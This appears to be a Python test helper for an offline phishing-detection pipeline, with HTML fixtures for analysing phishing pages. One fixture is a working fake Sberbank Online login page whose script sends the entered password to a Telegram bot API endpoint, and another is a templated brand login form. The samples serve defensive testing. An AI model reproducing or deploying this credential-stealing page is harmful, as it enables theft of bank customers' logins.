import uuid

from orchestrator.state import PhishingState
from orchestrator.graph import run_pipeline

TELEGRAM_KIT = """<html><head><title>Сбербанк Онлайн — вход</title></head><body>
<h1>СберБанк Онлайн</h1>
<form id="f"><input type="text" name="login" placeholder="Логин"><input type="password" id="p" name="password">
<button type="submit">Войти</button></form>
<script>document.getElementById('f').onsubmit=function(){fetch("https://api.telegram.org/bot7123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage?chat_id=-100123456&text="+document.getElementById('p').value);return false;}</script>
</body></html>"""

BRAND_LOGIN_KIT = """<html><head><title>{title}</title></head><body><h1>{h1}</h1>
<form action="/{path}/auth.php" method="post"><input type="email" name="email"><input type="password" name="pass">
<button type="submit">Войти</button></form><div class="footer">{footer}</div></body></html>"""


def run_page(url: str, html: str, **kw) -> PhishingState:
    """Analyses a landing page snapshot offline (no network)."""
    state = PhishingState(incident_id=f"t_{uuid.uuid4().hex[:8]}", source_type="url", raw_target=url, offline_mode=True,
                          precollected_links=[{"url": url, "final_url": url, "html": html, "redirect_chain": []}], **kw)
    return run_pipeline(state)


def run_file(name: str, data: bytes) -> PhishingState:
    state = PhishingState(incident_id=f"t_{uuid.uuid4().hex[:8]}", source_type=name.rsplit(".", 1)[-1],
                          raw_target=name, raw_bytes=data, offline_mode=True)
    return run_pipeline(state)
